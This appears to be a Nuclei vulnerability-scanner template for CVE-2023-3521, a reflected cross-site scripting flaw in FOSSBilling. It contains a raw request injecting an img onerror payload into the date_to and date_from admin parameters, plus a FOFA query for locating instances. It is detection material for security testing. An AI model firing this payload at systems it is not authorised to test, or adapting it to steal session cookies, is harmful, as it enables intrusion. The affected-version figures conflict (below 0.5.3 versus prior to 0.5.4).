http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src=x onerror=alert(3)>
    - FOSSBilling
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /admin?_url=%2Fadmin&date_to=''"><img+src=x+onerror=alert(3)>&date_from=''"><img+src=x+onerror=alert(3)>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-3521
info:
  author: ctflearner
  classification:
    cve-id: CVE-2023-3521
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.94342
    epss-score: 0.15059
  description: 'Cross-site Scripting (XSS) - Reflected in GitHub repository fossbilling/fossbilling
    prior to 0.5.4.

    '
  impact: 'Unauthenticated attackers can inject malicious JavaScript through date_to
    and date_from parameters to steal FOSSBilling administrator session cookies and
    access sensitive billing and customer data.

    '
  metadata:
    fofa-query: title="FOSSBilling"
    max-request: 1
    product: fossbilling
    verified: true
  name: FOSSBilling < 0.5.3 - Cross-Site Scripting
  reference:
  - https://huntr.com/bounties/76a3441d-7f75-4a8d-a7a0-95a7f5456eb0
  - https://nvd.nist.gov/vuln/detail/CVE-2023-3521
  remediation: 'Update FOSSBilling to version 0.5.4 or later that properly sanitizes
    date parameters in the admin interface and encodes output to prevent reflected
    XSS attacks.

    '
  severity: medium
  tags: cve2023,cve,fossbilling,xss,vuln
